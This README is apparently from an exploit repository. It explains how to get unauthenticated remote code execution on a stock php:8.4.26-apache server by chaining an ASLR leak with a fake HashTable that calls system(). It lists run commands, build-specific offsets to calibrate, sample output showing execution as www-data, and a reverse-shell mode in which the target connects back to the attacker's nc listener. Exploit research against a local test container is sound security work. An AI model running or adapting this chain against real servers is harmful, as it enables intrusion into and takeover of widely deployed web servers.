# Phase D: OOM to ASLR leak and fake HashTable

The why is in the root [README](../README.md). Unauthenticated RCE on a stock
`php:8.4.26-apache`, ASLR on, bases leaked over HTTP. Target on
`http://127.0.0.1:8083`. Authorised testing only.

The leak is from dinosn's `stock_aslr.py` (see Credits in the root README). The
**default fire is the fast amplification chain from 9bie**
([github.com/9bie/php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp)),
ported into `engine.py` as `Fast` — see "Fast vs stock" below.

## Setup

    docker compose up --build -d

## Run (RCE)

    python3 php2shell.py --url http://127.0.0.1:8083/index.php --cmd 'id>/tmp/p'
    docker compose exec target cat /tmp/p
    uid=33(www-data) gid=33(www-data) groups=33(www-data)

Like the stock chain, this saturates the prefork pool so the leak + arm + fire
land on the one free worker — `--blockers` defaults to 149 for the stock
`MaxRequestWorkers 150` pool (set it to `workers-1`, or `0` for a single-worker
target). The fast chain's command slot is 200 bytes (vs 14 on `--stock`), so any
normal command fits.

## Reverse shell

The 200-byte slot fits a whole `bash` reverse-shell one-liner, so the fire runs
it directly — no session staging. Start a listener (`nc -lvnp 4444`), then:

    python3 php2shell.py --url http://127.0.0.1:8083/index.php --lhost <LHOST> --lport 4444

`<LHOST>` is your listener as seen from the target (docker gateway or LAN IP).

## Fast vs stock

|            | default (fast, 9bie)                                  | `--stock` (dinosn baseline)                    |
| ---------- | ----------------------------------------------------- | ---------------------------------------------- |
| arming OOM | ~0.4 MB nested empty-file `$_FILES` (~320x heap/wire) | ~128 MB streamed                               |
| per fire   | ~2 s, non-corrupting (no rotate)                      | ~30-60 s remote, crash-rotate each try         |
| lands in   | ~1-2 fires                                            | many tries                                     |
| command    | <=200 bytes                                           | <=14 bytes (shell is staged via `php /tmp/s*`) |

The leak is identical and shared. The fast fire reoccupies the dangling
`PS(http_session_vars)` with a double-sided spray of fake `zend_reference`s
pointing at a 384-byte fake `zend_array` (`pDestructor=zif_system`) placed at
`chunk + FAST_S_OFFSET`.

### Calibration (`--s-off`)

`FAST_S_OFFSET` (default `0xF5398`) is **chunk-relative and build-specific** —
calibrated for stock `php:8.4.26-apache` amd64. On a different build, read it
once by dumping `PS(http_session_vars)` after the arm (worker is non-dumpable
only under FPM; mod_php workers can be read from the host as root):

    # on the target host, single-worker container, after one amplification arm:
    # http_session_vars = libphp_base + ps_globals(+0x1316820) + 0x168
    # S_offset = (its value) - (its value & ~0x1FFFFF)

then pass `--s-off 0x<value>`. Fall back to `--stock` (its `--sweep-table`
brute-forces the stock landing) if you cannot calibrate.

## Output

```
$ python3 php2shell.py --url http://127.0.0.1:8083/index.php --cmd 'id>/tmp/p'
[*] saturating pool with 149 blockers
[+] LEAK chunk=0x7fa922e00000 libphp=0x7fa924a55000
[*] fast arm+fire 1/6 (S=chunk+0xf5398)
$ docker compose exec target cat /tmp/p
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Teardown

    docker compose down
